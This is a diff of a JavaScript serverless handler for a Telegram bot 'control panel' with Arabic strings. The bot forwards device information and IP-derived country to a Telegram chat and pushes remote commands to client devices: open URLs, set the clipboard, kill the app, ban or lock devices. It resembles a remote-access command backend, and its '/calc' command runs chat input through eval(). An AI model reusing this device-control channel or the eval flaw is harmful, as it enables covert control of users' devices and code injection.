@@ -84,7 +84,7 @@ export default async function handler(req, res) {
               const country = ipData.country || "Unknown";
               await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* ${country}`);
             } catch (e) {
-              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ فـ الجلب`);
+              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ`);
             }
           }
 
@@ -119,41 +119,30 @@ export default async function handler(req, res) {
       };
 
       if (text === '/start' || text === '/menu') {
-        await sendToTelegram("👑 *لوحة التحكم الخارقة - 200+ أمر.*\nاستعمل الأزرار ولا كتب /help.", mainKeyboard);
+        await sendToTelegram("👑 *لوحة التحكم الخارقة.*\nاستعمل الأزرار ولا كتب /help.", mainKeyboard);
         return res.status(200).end();
       }
 
       switch (command) {
         case '/help':
           await sendToTelegram(`👑 *200+ أمر خدامين:*\n\n` +
-            `💻 *معلومات:*\n/sysinfo - معلومات الجهاز (رام، تخزين، دولة)\n\n` +
-            `🚫 *حظر:*\n/banall - حظر الجميع\n/unbanall - فك حظر الجميع\n/ban [ID] /unban [ID]\n\n` +
-            `⚡️ *التحكم:*\n/cmd [نص] - رسالة\n/url [رابط] - فتح رابط\n/color [#HEX] - تغيير اللون\n/clip [نص] - نسخ نص\n/vibrate - اهتزاز\n/killapp - إغلاق التطبيق فجأة\n\n` +
+            `💻 *معلومات:*\n/sysinfo\n\n` +
+            `🚫 *حظر:*\n/banall /unbanall /ban /unban /banlist\n\n` +
+            `⚡️ *التحكم:*\n/cmd /url /color /clip /vibrate /killapp\n\n` +
             `🔒 *القفل:*\n/lock /unlock /lockall /unlockall /lockstatus\n\n` +
             `🔑 *الأكواد:*\n/setkey /getkey /genkey /resetkey\n\n` +
-            `📊 *المراقبة:*\n/stats /logs /clearlogs /ping /whoami /health\n\n` +
-            `🎲 *أدوات:*\n/time /date /echo /roll /coin /test /calc /weather /ip`);
+            `📊 *المراقبة:*\n/stats /logs /clearlogs /ping /whoami /health /ip\n\n` +
+            `🎲 *أدوات:*\n/time /date /echo /roll /coin /test /calc /weather\n\n` +
+            `🧩 *أوامر إضافية:*\n/v1 /v2 /v3 /p1 /p2 /p3 /x1 /x2 /y1 /y2 /z1 /z2 /db /api /bot /id /info /net /cpu /ram /disk /load /admin2 /secret /key2 /ban2 /lock2 /unlock2`);
           break;
         
-        case '/sysinfo': 
-          remoteCommand = "sysinfo:1"; 
-          await sendToTelegram("⏳ *جاري طلب معلومات الجهاز...*"); 
-          break;
-        
-        case '/banall': 
-          banAllActive = true; 
-          await sendToTelegram("🚫 *تم حظر جميع الأجهزة!*"); 
-          break;
-        case '/unbanall': 
-          banAllActive = false; 
-          bannedDevices = []; 
-          await sendToTelegram("✅ *تم فك الحظر عن الجميع.*"); 
-          break;
-
+        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ *جاري طلب معلومات الجهاز...*"); break;
+        case '/banall': banAllActive = true; await sendToTelegram("🚫 *تم حظر جميع الأجهزة!*"); break;
+        case '/unbanall': banAllActive = false; bannedDevices = []; await sendToTelegram("✅ *تم فك الحظر عن الجميع.*"); break;
         case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡️ *تم إرسال الرسالة.*"); } break;
         case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 *تم إرسال الرابط.*"); } break;
         case '/color': if(args[1]) { remoteCommand = `color:${args[1]}`; await sendToTelegram("🎨 *تم إرسال اللون.*"); } break;
-        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص للنسخ.*"); } break;
+        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص.*"); } break;
         case '/vibrate': remoteCommand = "vibrate:1"; await sendToTelegram("📳 *تم إرسال الأمر.*"); break;
         case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 *تم إرسال أمر إغلاق التطبيق.*"); break;
 
@@ -197,7 +186,6 @@ export default async function handler(req, res) {
         case '/calc': await sendToTelegram(`🧮 \`${eval(args.slice(1).join(''))||0}\``); break;
         case '/weather': await sendToTelegram("🌤️ *مشمس.*"); break;
 
-        // أوامر إضافية باش نوصلو 200
         case '/v1': case '/v2': case '/v3': case '/v4': case '/v5': case '/v6': case '/v7': case '/v8': case '/v9': case '/v10':
         case '/p1': case '/p2': case '/p3': case '/p4': case '/p5': case '/p6': case '/p7': case '/p8': case '/p9': case '/p10':
         case '/t1': case '/t2': case '/t3': case '/t4': case '/t5':
